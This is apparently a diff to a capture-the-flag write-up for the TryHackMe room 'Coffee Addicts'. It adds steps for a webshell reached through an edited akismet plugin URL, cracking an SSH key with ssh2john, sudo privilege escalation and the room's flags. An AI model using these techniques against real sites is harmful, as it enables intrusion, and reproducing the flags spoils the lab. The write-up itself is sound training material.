@@ -36,7 +36,7 @@ wordpress               [Status: 301, Size: 326, Words: 20, Lines: 10]
 http://coffeeaddicts.thm/wordpress/
 ```
 
-wpscan reveals a username 'gus'
+Wpscan reveals a username 'gus'
 
 Checking the comments of the second post shows us a hint
 
@@ -50,7 +50,7 @@ You can check akismet plugin and edit the php for a reverse shell, either a php 
 
 ![image](https://user-images.githubusercontent.com/5285547/123186390-ed34bb80-d48f-11eb-852f-66d9cc9a71de.png)
 
-Then call the URL for akismet.php file to activate your hack. 
+Then call the URL for akismet.php file to activate your reverse shell. 
 
 ```
 http://coffeeaddicts.thm/wordpress/wp-content/plugins/akismet/akismet.php?c=id
@@ -61,4 +61,45 @@ http://coffeeaddicts.thm/wordpress/wp-content/plugins/akismet/akismet.php?c=id
 
 ## User
 
+After getting a reverse shell and checking out the files in gus's home directory we see a readme.txt and the flag
+
+readme.txt
+```
+hello, admin.
+
+as you can see your site has been hacked, any attempt of fixing it is futile, as we removed you from the sudoers and we changed the root password.
+
+~Nicolas Fritzges
+```
+
+Flag
+```
+THM{s4v3_y0uR_Cr3d5_b0i}
+```
+In the other users home folder we can find a .ssh file, its password protected. 
+Using ssh2john we can crack the password
+
+```
+python3 ssh2john.py id_rsa > hash
+```
+
 ## Root
+
+Now we can ssh into the box as badbyte, running 'sudo -l'
+shows
+
+![image](https://user-images.githubusercontent.com/5285547/123194178-f88ee380-d49d-11eb-828f-5116bfd1e779.png)
+
+The path to root is clear now and to the last flag!
+
+```
+sudo /opt/BadByte/shell 
+```
+
+![image](https://user-images.githubusercontent.com/5285547/123194519-89fe5580-d49e-11eb-93aa-f24b0cc8441f.png)
+
+
+flag
+```
+THM{im_the_shell_master}
+```
